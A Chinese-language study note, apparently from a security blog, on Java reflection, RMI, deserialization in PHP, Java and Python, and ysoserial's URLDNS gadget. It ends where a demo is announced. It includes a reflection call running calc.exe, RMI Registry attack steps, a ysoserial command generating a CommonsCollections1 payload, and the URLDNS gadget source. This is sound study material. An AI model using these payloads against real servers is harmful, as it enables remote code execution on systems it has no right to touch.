<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><a href="https://developer.aliyun.com/article/330847">反射setAccessible()方法-阿里云开发者社区 (aliyun.com)</a></p>
<h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p><a href="https://wx.zsxq.com/dweb2/index/columns/2212251881">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p>RMI全称是Remote Method Invocation，远程⽅法调⽤。从这个名字就可以看出，他的⽬标和RPC其实 是类似的，是让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法，只不过RMI是Java独 有的⼀种机制。</p>
<p>⼀个例⼦</p>
<p>RMI Server:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span></span><br><span class="line">            <span class="title class_">IRemoteHelloWorld</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⼀个RMI Server分为三部分：</p>
<ul>
<li>⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello() </li>
<li>⼀个实现了此接⼝的类 </li>
<li>⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了</li>
</ul>
<p>RMI Client：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.example.RMIServer;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        RMIServer.<span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIServer.IRemoteHelloWorld)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> hello.hello();</span><br><span class="line">        System.out.println( ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端就简单多了，使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在 本地使⽤⼀样了。</p>
<p>虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时 候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝ IRemoteHelloWorld ⾥，因为客户端也需要⽤到这个接⼝。</p>
<p>流程：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230321185000707.png" alt="image-20230321185000707"></p>
<p>RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。</p>
<p><strong>利用codebase攻击RMI Registry。</strong><del>这部分云了</del></p>
<p><a href="https://wx.zsxq.com/dweb2/index/columns/2212251881">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p>一个RMI过程有以下三个参与者： RMI Registry 、RMI Server、 RMI Client</p>
<p>通常我们在新建一个RMI Registry的时候，都会 直接绑定一个对象在上面，也就是说我们示例代码中的Server其实包含了Registry和Server两部分：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure>

<p>第一行创建并运行RMI Registry，第二行将RemoteHelloWorld对象绑定到Hello这个名字上。 Naming.bind 的第一个参数是一个URL，形如： rmi:&#x2F;&#x2F;host:port&#x2F;name 。</p>
<p>其中，host和port就是 RMI Registry的地址和端口，name是远程对象的名字。</p>
<p> 如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认 是 1099 ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Naming.bind(<span class="string">&quot;Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure>

<p>以上就是RMI整个的原理与流程。接下来，我们很自然地想到，RMI会给我们带来哪些安全问题？ 从两个方向思考一下这个问题： </p>
<ol>
<li>如果我们能访问RMI Registry服务，如何对其攻击？ </li>
<li>如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地 址），能不能进行攻击？</li>
</ol>
<p>如何攻击RMI Registry？</p>
<p>MI Registry是一个远程对象管理的地方，可以理解为一个远程对象的“后台”。我们可以尝试直 接访问“后台”功能，比如修改远程服务器上Hello对应的对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">Naming.rebind(<span class="string">&quot;rmi://192.168.135.142:1099/Hello&quot;</span>, h);</span><br></pre></td></tr></table></figure>

<p>但是这样会报错，因为Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。</p>
<p>不过list和lookup方法可以远程调用。 list方法可以列出目标上所有绑定的对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] s = Naming.list(<span class="string">&quot;rmi://192.168.135.142:1099&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>lookup作用就是获得某个远程对象。 那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用。</p>
<p>classAnnotations是什么？</p>
<p>众所周知，在序列化Java类的时候用到了一个类，叫 ObjectOutputStream 。这个类内部有一个方法 annotateClass ， ObjectOutputStream 的子类有需要向序列化后的数据里放任何内容，都可以重写 这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用。</p>
<p>所以，我们在分析序列化数据时看到的 classAnnotations ，实际上就是 annotateClass 方法写入的 内容。</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="不同语言的反序列化"><a href="#不同语言的反序列化" class="headerlink" title="不同语言的反序列化"></a>不同语言的反序列化</h3><p>为什么反序列化常常会带来安全隐患？</p>
<p> 一门成熟的语言，如果需要在网络上传递信息，通常会用到一些格式化数据，比如： JSON XML JSON和XML是通用数据交互格式，通常用于不同语言、不同环境下数据的交互，比如前端的JavaScript 通过JSON和后端服务通信、微信服务器通过XML和公众号服务器通信。</p>
<p>但这两个数据格式都有一个共 同的问题：不支持复杂的数据类型。 </p>
<p>大多数处理方法中，JSON和XML支持的数据类型就是基本数据类型，整型、浮点型、字符串、布尔 等，如果开发者希望在传输数据的时候直接传输一个对象，那么就不得不想办法扩展基础的 JSON（XML）语法。</p>
<p> 比如，Jackson和Fastjson这类序列化库，在JSON（XML）的基础上进行改造，通过特定的语法来传递 对象；亦或者如RMI，直接使用Java等语言内置的序列化方法，将一个对象转换成一串二进制数据进行 传输。 </p>
<p>不管是Jackson、Fastjson还是编程语言内置的序列化方法，一旦涉及到序列化与反序列化数据，就可 能会涉及到安全问题。</p>
<p>但首先要理解的是，“反序列化漏洞”是对一类漏洞的泛指，而不是专指某种反序 列化方法导致的漏洞，比如Jackson反序列化漏洞和Java readObject造成的反序列化漏洞就是完全不同 的两种漏洞。</p>
<h4 id="反序列化方法的对比"><a href="#反序列化方法的对比" class="headerlink" title="反序列化方法的对比"></a>反序列化方法的对比</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象。</span><br><span class="line"></span><br><span class="line">但Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者 在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。</span><br><span class="line"></span><br><span class="line">当然，PHP中也提供了一个魔术方法叫 __wakeup ，在反序列化的时候进行触发。很多人会认为Java的 readObject 和PHP的 __wakeup 类似，但其实不全对，虽然都是在反序列化的时候触发，但他们解决 的问题稍微有些差异。 </span><br><span class="line"></span><br><span class="line">java设计 readObject 的思路和PHP的 __wakeup 不同点在于： </span><br><span class="line">readObject 倾向于解决“反序列化时如何还原一个完整对象”这个问题，而PHP的 __wakeup 更倾向于解决“反序列化后如何初始化这个对象”的问题。 </span><br><span class="line">但这个设计理念可以说是决定为什么Java的反序列化漏洞这么多的根本原因。</span><br></pre></td></tr></table></figure>

<h4 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP的序列化是开发者不能参与的，开发者调用 serialize 函数后，序列化的数据就已经完成了，你得到的是一个完整的对象，你并不能在序列化数据流里新增某一个内容，你如果想插入新的内容，只有将其保存在一个属性中。也就是说PHP的序列化、反序列化是一个纯内部的过程，而其 __sleep 、__wakeup 魔术方法的目的就是在序列化、反序列化的前后执行一些操作。</span><br></pre></td></tr></table></figure>

<p>一个非常典型的PHP序列化例子，就是含有资源类型的PHP类，如数据库连接：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;dsn = <span class="variable">$dsn</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;link = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$this</span>-&gt;dsn, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-</span><br><span class="line">&gt;password);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PHP中，资源类型的对象默认是不会写入序列化数据中的。那么上述Connection类的 $link 属性在序 列化后就是null，反序列化时拿到的也是null。 那么，如果我想要反序列化时拿到的 $link 就是一个数据库连接，我就需要编写 __wakeup 方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;dsn = <span class="variable">$dsn</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;link = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$this</span>-&gt;dsn, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-</span><br><span class="line">&gt;password);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;dsn&#x27;</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java反序列化的操作，很多是需要开发者深入参与的，所以你会发现大量的库会实现 readObject 、writeObject 方法，这和PHP中 __wakeup 、 __sleep 很少使用是存在鲜明对比的。</span><br><span class="line">这次再来说说objectAnnotation。</span><br></pre></td></tr></table></figure>

<p>Java在序列化时一个对象，将会调用这个对象中的 writeObject 方法，参数类型是ObjectOutputStream ，开发者可以将任何内容写入这个stream中；反序列化时，会调用 readObject ，开发者也可以从中读取出前面写入的内容，并进行处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line"><span class="keyword">public</span> String name;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">Person(String name, <span class="type">int</span> age) &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line"><span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span></span><br><span class="line">IOException &#123;</span><br><span class="line">s.defaultWriteObject();</span><br><span class="line">s.writeObject(<span class="string">&quot;This is a object&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line"><span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">s.defaultReadObject();</span><br><span class="line"><span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> (String) s.readObject();</span><br><span class="line">System.out.println(message);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里在执行完默认的 s.defaultWriteObject() 后，向stream里写入了一个字符串 This is a object 。</p>
<p>我们写入的字符串 This is a object 被放在 objectAnnotation 的位置。</p>
<p>在反序列化时，读取了这个字符串，并将其输出。</p>
<h4 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h4><p>Python反序列化和Java、PHP有个显著的区别，就是Python的反序列化过程实际上是在执行一个基于 栈的虚拟机。我们可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序。 所以，Python的反序列化可以立即导致任意函数、命令执行漏洞，与需要gadget的PHP和Java相比更加 危险。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>总结一下，从危害上来看，Python的反序列化危害是最大的；从应用广度上来看，Java的反序列化是最 常被用到的；从反序列化的原理上来看，PHP和Java是类似又不尽相同的。</p>
<h3 id="URLDNS-最简单的Gadget"><a href="#URLDNS-最简单的Gadget" class="headerlink" title="URLDNS-最简单的Gadget"></a>URLDNS-最简单的Gadget</h3><p>说在前面：</p>
<p><strong>ysoserial</strong>：可以让⽤户根据⾃⼰选择的利⽤链，⽣成反 序列化利⽤数据，通过将这些数据发送给⽬标，从⽽执⾏⽤户预先定义的命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利⽤链也叫“gadget chains”，我们通常称为gadget。如果你学过PHP反序列化漏洞，那么就可以将gadget理解为⼀种⽅法，它连接的是从触发位置开始到执⾏命令的位置结束，在PHP⾥可能</span><br><span class="line">是 __desctruct 到 eval ；如果你没学过其他语⾔的反序列化漏洞，那么gadget就是⼀种⽣成POC的⽅法罢了。</span><br></pre></td></tr></table></figure>

<p>ysoserial的使⽤也很简单，虽然我们暂时先不理解 CommonsCollections ，但是⽤ysoserial可以很容 易地⽣成这个gadget对应的POC：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</span><br></pre></td></tr></table></figure>

<p>如上，ysoserial⼤部分的gadget的参数就是⼀条命令，⽐如这⾥是 id 。⽣成好的POC发送给⽬标，如 果⽬标存在反序列化漏洞，并满⾜这个gadget对应的条件，则命令 id 将被执⾏。</p>
<p>URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不 是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。 虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时 使⽤： 使⽤Java内置的类构造，对第三⽅库没有依赖 在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞.</p>
<p>可以在<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">ysoserial&#x2F;URLDNS.java at master · frohoff&#x2F;ysoserial (github.com)</a></p>
<p>看到下面的生成代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟着ysoserial项目中URLDNS的Gadget来分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">    HashMap.hash()</span><br><span class="line">    URL.hashCode()</span><br></pre></td></tr></table></figure>

<p>下面是一个demo</p>
